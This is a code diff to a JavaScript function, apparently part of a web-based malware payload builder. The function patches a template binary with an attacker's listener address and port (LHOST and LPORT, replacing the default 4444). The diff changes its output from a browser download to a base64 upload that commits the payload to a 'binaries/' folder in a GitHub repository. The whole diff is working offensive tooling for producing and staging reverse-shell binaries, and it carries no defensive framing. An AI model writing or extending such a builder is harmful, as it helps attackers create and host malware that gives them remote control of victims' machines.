@@ -553,29 +553,31 @@ async function handlePayloadGeneration() {
             filename = `payload_${lhost}.${ext}`;
         }
 
-        btn.innerText = 'PATCHING...';
+        btn.innerText = 'UPLOADING...';
 
         // Use the Patcher module
-        // We assume the template was made with LPORT 4444. If not, user should have specified, 
-        // but for now we hardcode the "Old Port" to search for as 4444 or let user specify?
-        // The plan didn't add an input for "Old Port", so we assume 4444.
         const patchedBlob = Patcher.patch(buffer, placeholder, lhost, "4444", lport);
 
-        // Trigger Download
-        const url = window.URL.createObjectURL(patchedBlob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-        document.body.removeChild(a);
+        // Convert Blob to Base64 for GitHub API
+        const reader = new FileReader();
+        reader.readAsDataURL(patchedBlob);
+        reader.onloadend = async function () {
+            const base64data = reader.result.split(',')[1];
 
-        btn.innerText = 'SUCCESS! DOWNLOAD STARTED';
-        setTimeout(() => {
-            btn.innerText = 'GENERATE_PAYLOAD';
-            btn.disabled = false;
-        }, 3000);
+            try {
+                // Upload to binaries/ folder
+                const targetPath = `binaries/${filename}`;
+                await updateFile(targetPath, base64data, `Add payload ${filename}`, true);
+
+                btn.innerText = 'SAVED TO REPO';
+                setTimeout(() => {
+                    btn.innerText = 'GENERATE_PAYLOAD';
+                    btn.disabled = false;
+                }, 3000);
+            } catch (err) {
+                throw new Error("Upload Failed: " + err.message);
+            }
+        };
 
     } catch (e) {
         console.error(e);
